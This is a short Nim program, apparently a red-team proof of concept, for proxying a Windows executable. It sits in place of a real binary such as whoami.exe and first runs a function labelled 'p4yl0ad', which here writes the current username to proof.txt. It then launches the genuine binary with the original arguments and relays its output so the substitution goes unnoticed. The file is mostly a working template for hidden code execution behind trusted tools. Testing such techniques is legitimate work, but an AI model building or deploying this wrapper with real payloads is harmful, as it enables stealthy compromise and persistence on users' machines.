import os
import osproc
import streams
import winim/lean

# set by compile parameter -d:proxybin=xxx
const proxyBin {.strdefine.}: string = "C:\\Windows\\system32\\whoami.exe"

proc p4yl0ad() =
    # whoami from https://github.com/chvancooten/NimPlant
    var 
        username: string
        buf : array[257, TCHAR]
        lpBuf : LPWSTR = addr buf[0]
        pcbBuf : DWORD = int32(len(buf))

    discard GetUserName(lpBuf, &pcbBuf)
    for character in buf:
        if character == 0: break
        username.add(char(character))

    var f = open("proof.txt", FileMode.fmWrite)
    f.write(username)
    f.close()

# run the payload
p4yl0ad()

# run the real binary
let process = osproc.startProcess(proxyBin, args = commandLineParams(), options = {poUsePath, poStdErrToStdOut})
let retCode = process.waitForExit()
echo process.outputStream.readAll()
process.close()
quit(retCode)
